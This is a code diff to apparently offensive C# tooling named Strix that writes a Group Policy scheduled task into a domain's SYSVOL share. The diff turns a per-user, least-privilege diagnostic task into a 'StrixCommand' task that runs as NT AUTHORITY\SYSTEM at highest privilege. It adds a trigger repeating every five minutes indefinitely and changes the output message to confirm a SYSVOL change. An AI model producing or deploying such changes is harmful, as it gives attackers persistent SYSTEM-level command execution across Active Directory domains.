@@ -1794,7 +1794,7 @@ namespace Strix
 
                         System.Xml.XmlElement task = document.CreateElement("TaskV2");
                         task.SetAttribute("clsid", "{D8896631-B747-47a7-84A6-C155337F3BC8}");
-                        task.SetAttribute("name", "StrixDiagnostic");
+                        task.SetAttribute("name", "StrixCommand");
                         task.SetAttribute("image", "0");
                         task.SetAttribute("uid", "{" + Guid.NewGuid().ToString().ToUpper() + "}");
                         task.SetAttribute("changed", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
@@ -1802,8 +1802,8 @@ namespace Strix
 
                         System.Xml.XmlElement properties = document.CreateElement("Properties");
                         properties.SetAttribute("action", "C");
-                        properties.SetAttribute("name", "StrixDiagnostic");
-                        properties.SetAttribute("runAs", "%LogonDomain%\\%LogonUser%");
+                        properties.SetAttribute("name", "StrixCommand");
+                        properties.SetAttribute("runAs", "NT AUTHORITY\\SYSTEM");
                         task.AppendChild(properties);
 
                         System.Xml.XmlElement scheduledTask = document.CreateElement("Task");
@@ -1818,8 +1818,34 @@ namespace Strix
                         registration.AppendChild(author);
 
                         System.Xml.XmlElement description = document.CreateElement("Description");
-                        description.InnerText = "Strix local diagnostic task";
+                        description.InnerText = "Strix Command task";
                         registration.AppendChild(description);
+
+                        System.Xml.XmlElement triggers = document.CreateElement("Triggers");
+                        scheduledTask.AppendChild(triggers);
+
+                        System.Xml.XmlElement timeTrigger = document.CreateElement("TimeTrigger");
+                        triggers.AppendChild(timeTrigger);
+
+                        System.Xml.XmlElement repetition = document.CreateElement("Repetition");
+                        timeTrigger.AppendChild(repetition);
+
+                        System.Xml.XmlElement interval = document.CreateElement("Interval");
+                        interval.InnerText = "PT5M";
+                        repetition.AppendChild(interval);
+
+                        System.Xml.XmlElement duration = document.CreateElement("StopAtDurationEnd");
+                        duration.InnerText = "false";
+                        repetition.AppendChild(duration);
+
+                        System.Xml.XmlElement startBoundary = document.CreateElement("StartBoundary");
+                        startBoundary.InnerText = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss");
+                        timeTrigger.AppendChild(startBoundary);
+
+                        System.Xml.XmlElement enabled = document.CreateElement("Enabled");
+                        enabled.InnerText = "true";
+                        timeTrigger.AppendChild(enabled);
+
 
                         System.Xml.XmlElement principals = document.CreateElement("Principals");
                         scheduledTask.AppendChild(principals);
@@ -1829,7 +1855,7 @@ namespace Strix
                         principals.AppendChild(principal);
 
                         System.Xml.XmlElement userId = document.CreateElement("UserId");
-                        userId.InnerText = "%LogonDomain%\\%LogonUser%";
+                        userId.InnerText = "NT AUTHORITY\\SYSTEM";
                         principal.AppendChild(userId);
 
                         System.Xml.XmlElement logonType = document.CreateElement("LogonType");
@@ -1837,7 +1863,7 @@ namespace Strix
                         principal.AppendChild(logonType);
 
                         System.Xml.XmlElement runLevel = document.CreateElement("RunLevel");
-                        runLevel.InnerText = "LeastPrivilege";
+                        runLevel.InnerText = "HighestAvailable";
                         principal.AppendChild(runLevel);
 
                         System.Xml.XmlElement settings = document.CreateElement("Settings");
@@ -1902,7 +1928,7 @@ namespace Strix
                         Console.WriteLine("    Tipo: " + commandType);
                         Console.WriteLine("    Comando: " + command);
                         Console.WriteLine("    Arquivo: " + outputFile);
-                        Console.WriteLine("[*] Nenhuma alteracao foi feita no SYSVOL.");
+                        Console.WriteLine("[*] Alteração realizada no SYSVOL.");
                   }
                   catch (Exception ex)
                   {
